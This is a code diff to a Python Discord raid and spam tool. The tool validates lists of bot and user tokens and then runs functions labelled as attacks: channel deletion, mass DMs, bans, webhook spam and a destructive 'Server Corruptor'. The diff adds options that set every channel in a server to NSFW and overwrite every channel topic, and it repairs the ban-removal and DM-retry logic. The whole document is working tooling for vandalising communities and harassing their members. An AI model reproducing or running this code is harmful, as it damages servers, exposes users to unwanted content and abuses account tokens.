@@ -14,6 +14,7 @@ try:
     import string
     import ctypes
     import asyncio
+    import collections
     import discord
     import requests
     import youtube_dl
@@ -120,50 +121,88 @@ if usemultiple == True:
     useable = []
     useabletokens = []
     clear()
-    if sys.platform.startswith('win32'):
-        with open (".\\spammer\\smtokens.txt", "r") as handle:
-            tokens = handle.readlines()
-    elif sys.platform.startswith('linux'):
+    if clienttype.lower() == "bot":
         with open ("spammer/smtokens.txt", "r") as handle:
             tokens = handle.readlines()
-    print ("Getting token info...")
-    for token in tokens:
-        apilink = 'https://discordapp.com/api/v6/users/@me'
-        headers = {'Authorization': "Bot " + token.rstrip(), 'Content-Type': 'application/json'}
-        src = requests.get(apilink, headers=headers)
-        if "401: Unauthorized" in str(src.content):
-            pass
-        else:
-            response = json.loads(src.content.decode())
-            useable.append(response['username']+"#"+response['discriminator']+" (ID: "+str(response['id'])+") ")
-            useabletokens.append(token.rstrip())
-    while True:
-        clear()
-        count = -1
-        print (colored("Select the Bot to use.\n-------------------------\n",menucolour))
-        if sys.platform.startswith('win32'):
-            if len(useable) > 40:
-                screensize = 7
-                screensize += len(useable)
-                os.system('mode con:cols=70 lines={}'.format(str(screensize)))
-        elif sys.platform.startswith('linux'):
-            if len(useable) > 40:
-                screensize = 7
-                screensize += len(useable)
-                os.system("printf '\033[8;{};70t'".format(str(screensize)))
-        for bot in useable:
-            count += 1
-            print(colored(str(count)+". "+bot,menucolour))
-        print (colored("\n-------------------------",menucolour))
-        botsel = input("\nBot of choice: ")
-        try:
-            token = useabletokens[int(botsel)]
-        except Exception:
+        print ("Getting token info...")
+        for token in tokens:
+            apilink = 'https://discordapp.com/api/v6/users/@me'
+            headers = {'Authorization': "Bot " + token.rstrip(), 'Content-Type': 'application/json'}
+            src = requests.get(apilink, headers=headers)
+            if "401: Unauthorized" in str(src.content):
+                pass
+            else:
+                response = json.loads(src.content.decode())
+                useable.append(response['username']+"#"+response['discriminator']+" (ID: "+str(response['id'])+") ")
+                useabletokens.append(token.rstrip())
+        while True:
             clear()
-            print("Invalid Option")
-            input()
-        else:
-            break
+            count = -1
+            print (colored("Select the Bot to use.\n-------------------------\n",menucolour))
+            if sys.platform.startswith('win32'):
+                if len(useable) > 40:
+                    screensize = 7
+                    screensize += len(useable)
+                    os.system('mode con:cols=70 lines={}'.format(str(screensize)))
+            elif sys.platform.startswith('linux'):
+                if len(useable) > 40:
+                    screensize = 7
+                    screensize += len(useable)
+                    os.system("printf '\033[8;{};70t'".format(str(screensize)))
+            for bot in useable:
+                count += 1
+                print(colored(str(count)+". "+bot,menucolour))
+            print (colored("\n-------------------------",menucolour))
+            botsel = input("\nBot of choice: ")
+            try:
+                token = useabletokens[int(botsel)]
+            except Exception:
+                clear()
+                print("Invalid Option")
+                input()
+            else:
+                break
+    else:
+        with open ("tokens.txt", "r") as handle:
+            tokens = handle.readlines()
+        print ("Getting token info...")
+        for token in tokens:
+            apilink = 'https://discordapp.com/api/v6/users/@me'
+            headers = {'Authorization': token.rstrip(), 'Content-Type': 'application/json'}
+            src = requests.get(apilink, headers=headers)
+            if "401: Unauthorized" in str(src.content):
+                pass
+            else:
+                response = json.loads(src.content.decode())
+                useable.append(response['username']+"#"+response['discriminator']+" (ID: "+str(response['id'])+") ")
+                useabletokens.append(token.rstrip())
+        while True:
+            clear()
+            count = -1
+            print (colored("Select the User to use.\n-------------------------\n",menucolour))
+            if sys.platform.startswith('win32'):
+                if len(useable) > 40:
+                    screensize = 7
+                    screensize += len(useable)
+                    os.system('mode con:cols=70 lines={}'.format(str(screensize)))
+            elif sys.platform.startswith('linux'):
+                if len(useable) > 40:
+                    screensize = 7
+                    screensize += len(useable)
+                    os.system("printf '\033[8;{};70t'".format(str(screensize)))
+            for user in useable:
+                count += 1
+                print(colored(str(count)+". "+user,menucolour))
+            print (colored("\n-------------------------",menucolour))
+            usersel = input("\nUser of choice: ")
+            try:
+                token = useabletokens[int(usersel)]
+            except Exception:
+                clear()
+                print("Invalid Option")
+                input()
+            else:
+                break
 
 #Attacks
 def deletechannel(channel):
@@ -227,7 +266,7 @@ def senddmtouser(user,content,usetts):
     src = requests.post("https://discordapp.com/api/v6/channels/"+userdm+"/messages", headers=headers, json=payload)
     if "You are being rate limited." in str(src.content):
         time.sleep(1)
-        senddmtouser(user,content)
+        senddmtouser(user,content,usetts)
 
 def banuser(user,server):
     if clienttype == 'bot':
@@ -337,6 +376,28 @@ def corrupt_role(serverid,roleid,rolename):
     if "You are being rate limited." in str(src.content):
         time.sleep(1)
         corrupt_role(serverid,roleid,rolename)
+
+def nsfwchannel(channelid):
+    if clienttype == 'bot':
+        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
+    else:
+        headers={ 'Authorization': token,'Content-Type': 'application/json'}
+    payload = {'nsfw': 'true'}
+    src = requests.patch('https://discordapp.com/api/v6/channels/{}'.format(channelid), headers=headers,json=payload)
+    if "You are being rate limited." in str(src.content):
+        time.sleep(1)
+        nsfwchannel(channelid)
+
+def topicedit(channelid,newtopic):
+    if clienttype == 'bot':
+        headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
+    else:
+        headers={ 'Authorization': token,'Content-Type': 'application/json'}
+    payload = {'topic': newtopic}
+    src = requests.patch('https://discordapp.com/api/v6/channels/{}'.format(channelid), headers=headers,json=payload)
+    if "You are being rate limited." in str(src.content):
+        time.sleep(1)
+        topicedit(channelid,newtopic)
 
 def webhook_spam(webhook,content):
     if content == 'asc':
@@ -668,21 +729,18 @@ async def main(SERVER):
 
                         if toggleopts['rembans'] == True:
                             print ("Removing bans.")
-                            bans = await server.bans()
                             try:
+                                bans = await server.bans()
                                 for ban in bans:
-                                    for user in ban:
-                                        pool.add_task(removeban,str(server.id),str(user.id))
-                            except Exception:
-                                pass
+                                    print(colored("Removing ban for: {}".format(str(ban.user))))
+                                    pool.add_task(removeban,str(server.id),str(ban.user.id))
+                            except Exception as e:
+                                print (e)
 
                         if toggleopts['deleteemojis'] == True:
                             print ("Deleting Emojis.")
                             for emoji in server.emojis:
-                                try:
-                                    pool.add_task(removeemoji,server.id,emoji.id)
-                                except Exception as er:
-                                    print(er)
+                                pool.add_task(removeemoji,server.id,emoji.id)
                             await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
 
                         if toggleopts['senddm'] == True:
@@ -999,6 +1057,8 @@ async def main(SERVER):
             print(colored("5.  Channel Webhook Smasher",menucolour))
             print(colored("6.  Server Corruptor (Destructive)",menucolour))
             print(colored("7.  Music Player",menucolour))
+            print(colored("8.  Make all channels NSFW",menucolour))
+            print(colored("9.  Change All channels topic",menucolour))
             sel = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Selection: ')
             if int(sel) == 0:
                 await main(SERVER)
@@ -1123,6 +1183,24 @@ async def main(SERVER):
                     await main(SERVER)
             elif int(sel) == 7:
                 await music_player_channel_select(server)
+            elif int(sel) == 8:
+                y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Continue\nY/N: ')
+                if y.lower() == 'y':
+                    for channel in server.channels:
+                        pool.add_task(nsfwchannel,channel.id)
+                    await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
+                    await main(SERVER)
+                else:
+                    await main(SERVER)
+            elif int(sel) == 9:
+                print(colored("0. Back\nEnter New Name"))
+                y = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
+                if y == "0":
+                    await main(SERVER)
+                for channel in server.channels:
+                    pool.add_task(topicedit,channel.id,y)
+                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
+                await main(SERVER)
             else:
                 await main(SERVER)
 
